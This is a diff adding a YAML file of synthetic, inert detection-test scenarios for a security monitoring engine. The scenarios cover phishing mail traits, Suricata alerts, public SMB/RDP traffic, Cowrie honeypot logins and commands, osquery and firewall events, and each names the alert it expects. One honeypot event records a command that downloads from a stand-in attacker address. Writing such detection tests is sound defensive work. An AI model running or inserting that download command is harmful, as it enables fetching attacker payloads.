@@ -1,0 +1,244 @@
+# Escenarios de validacion de deteccion (SIM-1/SIM-2).
+# Telemetria sintetica e inerte: el mismo esquema de eventos que
+# envia el sensor, sin ejecutar nada en ningun equipo. Cada escenario
+# declara las alertas que el motor DEBE disparar (shipped rule/sequence
+# id); el test de CI falla si una deja de detectarse.
+
+- name: 'Phishing: adjunto de extension activa (sintetico)'
+  id: sim-mail-risky-attachment
+  description: 'Invocacion sintetica que valida la regla con los mismos campos que envia el sensor: el correo trae
+    un adjunto de extension activa. Telemetria inerte; nada se ejecuta en ningun equipo.'
+  attack:
+  - t1566.001
+  host: LAB-SIM-MAIL-RISKY-ATTACHM
+  user: CORP\sim
+  expected:
+  - rule: soc-mail-risky-attachment
+  events:
+  - type: email.message
+    source: eml
+    attributes:
+      mail_risky_attachment: 'true'
+      mail_subject: Albaran firmado
+      mail_from: logistica@transportista.tk
+- name: 'Phishing: fallo DMARC declarado en cabecera (sintetico)'
+  id: sim-mail-dmarc-fail
+  description: 'Invocacion sintetica que valida la regla con los mismos campos que envia el sensor: la cabecera
+    declara un fallo DMARC. Telemetria inerte; nada se ejecuta en ningun equipo.'
+  attack:
+  - t1566
+  host: LAB-SIM-MAIL-DMARC-FAIL
+  user: CORP\sim
+  expected:
+  - rule: soc-mail-dmarc-fail
+  events:
+  - type: email.message
+    source: eml
+    attributes:
+      mail_dmarc_reported_fail: 'true'
+      mail_from: ceo@dominio-imitado.tk
+- name: 'Phishing: URL con direccion IP literal (sintetico)'
+  id: sim-mail-ip-url
+  description: 'Invocacion sintetica que valida la regla con los mismos campos que envia el sensor: el enlace del
+    correo usa una direccion IP literal. Telemetria inerte; nada se ejecuta en ningun equipo.'
+  attack:
+  - t1566.002
+  host: LAB-SIM-MAIL-IP-URL
+  user: CORP\sim
+  expected:
+  - rule: soc-mail-ip-url
+  events:
+  - type: email.message
+    source: eml
+    attributes:
+      mail_url_ip_literal: 'true'
+      mail_subject: Pago pendiente
+      mail_from: admin@proveedor.tk
+- name: 'Phishing: Reply-To de otro dominio (sintetico)'
+  id: sim-mail-reply-mismatch
+  description: 'Invocacion sintetica que valida la regla con los mismos campos que envia el sensor: el Reply-To
+    pertenece a otro dominio. Telemetria inerte; nada se ejecuta en ningun equipo.'
+  attack:
+  - t1566
+  host: LAB-SIM-MAIL-REPLY-MISMATC
+  user: CORP\sim
+  expected:
+  - rule: soc-mail-reply-mismatch
+  events:
+  - type: email.message
+    source: eml
+    attributes:
+      mail_reply_domain_mismatch: 'true'
+      mail_from: gerente@empresa-corp.tk
+- name: 'Suricata: firma de prioridad alta (sintetico)'
+  id: sim-ids-priority-high
+  description: 'Invocacion sintetica que valida la regla con los mismos campos que envia el sensor: Suricata reporta
+    una firma de prioridad 1. Telemetria inerte; nada se ejecuta en ningun equipo.'
+  attack: []
+  host: LAB-SIM-IDS-PRIORITY-HIGH
+  user: CORP\sim
+  expected:
+  - rule: soc-ids-priority-high
+  events:
+  - type: network.alert
+    source: suricata
+    attributes:
+      ids_signature: GPL ATTACK_RESPONSE id check returned root
+      ids_priority: '1'
+      ids_action: alert
+- name: 'Suricata: firma de prioridad media (sintetico)'
+  id: sim-ids-priority-medium
+  description: 'Invocacion sintetica que valida la regla con los mismos campos que envia el sensor: Suricata reporta
+    una firma de prioridad 2. Telemetria inerte; nada se ejecuta en ningun equipo.'
+  attack: []
+  host: LAB-SIM-IDS-PRIORITY-MEDIU
+  user: CORP\sim
+  expected:
+  - rule: soc-ids-priority-medium
+  events:
+  - type: network.alert
+    source: suricata
+    attributes:
+      ids_signature: ET SCAN Possible Nmap User-Agent Observed
+      ids_priority: '2'
+      ids_action: alert
+- name: 'Suricata: bloqueo declarado por el proveedor (sintetico)'
+  id: sim-ips-reported-drop
+  description: 'Invocacion sintetica que valida la regla con los mismos campos que envia el sensor: Suricata declara
+    el bloqueo del trafico. Telemetria inerte; nada se ejecuta en ningun equipo.'
+  attack: []
+  host: LAB-SIM-IPS-REPORTED-DROP
+  user: CORP\sim
+  expected:
+  - rule: soc-ips-reported-drop
+  events:
+  - type: network.alert
+    source: suricata
+    attributes:
+      ids_signature: ET TROJAN Known malicious outbound connection
+      ids_priority: '1'
+      ids_verdict: reported_drop
+- name: 'NDR: SMB hacia una direccion publica (sintetico)'
+  id: sim-ndr-public-smb
+  description: 'Invocacion sintetica que valida la regla con los mismos campos que envia el sensor: el monitor de
+    red ve SMB hacia una direccion publica. Telemetria inerte; nada se ejecuta en ningun equipo.'
+  attack:
+  - t1021.002
+  host: LAB-SIM-NDR-PUBLIC-SMB
+  user: CORP\sim
+  expected:
+  - rule: soc-ndr-public-smb
+  events:
+  - type: network.connect
+    source: zeek
+    network:
+      protocol: TCP
+      destination_ip: 203.0.113.50
+      destination_port: 445
+    attributes:
+      destination_scope: public
+- name: 'NDR: RDP hacia una direccion publica (sintetico)'
+  id: sim-ndr-public-rdp
+  description: 'Invocacion sintetica que valida la regla con los mismos campos que envia el sensor: el monitor de
+    red ve RDP hacia una direccion publica. Telemetria inerte; nada se ejecuta en ningun equipo.'
+  attack:
+  - t1021.001
+  host: LAB-SIM-NDR-PUBLIC-RDP
+  user: CORP\sim
+  expected:
+  - rule: soc-ndr-public-rdp
+  events:
+  - type: network.connect
+    source: zeek
+    network:
+      protocol: TCP
+      destination_ip: 203.0.113.51
+      destination_port: 3389
+    attributes:
+      destination_scope: public
+- name: 'Cowrie: acceso aceptado en el honeypot (sintetico)'
+  id: sim-honeypot-login
+  description: 'Invocacion sintetica que valida la regla con los mismos campos que envia el sensor: el honeypot
+    acepta un inicio de sesion. Telemetria inerte; nada se ejecuta en ningun equipo.'
+  attack:
+  - t1078
+  host: LAB-SIM-HONEYPOT-LOGIN
+  user: CORP\sim
+  expected:
+  - rule: soc-honeypot-login
+  events:
+  - type: honeypot.login
+    source: cowrie
+    attributes:
+      honeypot_event: cowrie.login.success
+      honeypot_username: root
+- name: 'Cowrie: comando observado en la sesion (sintetico)'
+  id: sim-honeypot-command
+  description: 'Invocacion sintetica que valida la regla con los mismos campos que envia el sensor: el honeypot
+    observa un comando de sesion. Telemetria inerte; nada se ejecuta en ningun equipo.'
+  attack:
+  - t1059
+  host: LAB-SIM-HONEYPOT-COMMAND
+  user: CORP\sim
+  expected:
+  - rule: soc-honeypot-command
+  events:
+  - type: honeypot.command
+    source: cowrie
+    attributes:
+      honeypot_input: wget http://203.0.113.10/x
+      honeypot_input_kind: command
+- name: 'osquery: nuevo puerto administrativo en todas las interfaces (sintetico)'
+  id: sim-osquery-admin-listener
+  description: 'Invocacion sintetica que valida la regla con los mismos campos que envia el sensor: osquery descubre
+    un puerto administrativo expuesto en todas las interfaces. Telemetria inerte; nada se ejecuta en ningun equipo.'
+  attack: []
+  host: LAB-SIM-OSQUERY-ADMIN-LIST
+  user: CORP\sim
+  expected:
+  - rule: soc-osquery-admin-listener
+  events:
+  - type: host.query
+    source: osquery
+    attributes:
+      query_name: bt_exposed_admin_ports
+      query_action: added
+      query_counter: '3'
+      column_address: 0.0.0.0
+      column_port: '22'
+- name: 'Firewall: conexion administrativa entrante permitida (sintetico)'
+  id: sim-firewall-admin-allow
+  description: 'Invocacion sintetica que valida la regla con los mismos campos que envia el sensor: el cortafuegos
+    permite una conexion administrativa entrante. Telemetria inerte; nada se ejecuta en ningun equipo.'
+  attack: []
+  host: LAB-SIM-FIREWALL-ADMIN-ALL
+  user: CORP\sim
+  expected:
+  - rule: soc-firewall-admin-allow
+  events:
+  - type: network.firewall
+    source: windows-firewall
+    network:
+      destination_ip: 10.10.0.20
+      destination_port: 22
+    attributes:
+      firewall_action: allow
+      firewall_direction: inbound
+- name: 'Firewall: intento administrativo entrante descartado (sintetico)'
+  id: sim-firewall-admin-drop
+  description: 'Invocacion sintetica que valida la regla con los mismos campos que envia el sensor: el cortafuegos
+    descarta un intento administrativo entrante. Telemetria inerte; nada se ejecuta en ningun equipo.'
+  attack: []
+  host: LAB-SIM-FIREWALL-ADMIN-DRO
+  user: CORP\sim
+  expected:
+  - rule: soc-firewall-admin-drop
+  events:
+  - type: network.firewall
+    source: windows-firewall
+    network:
+      destination_ip: 10.10.0.21
+      destination_port: 3389
+    attributes:
+      firewall_action: drop
+      firewall_direction: inbound
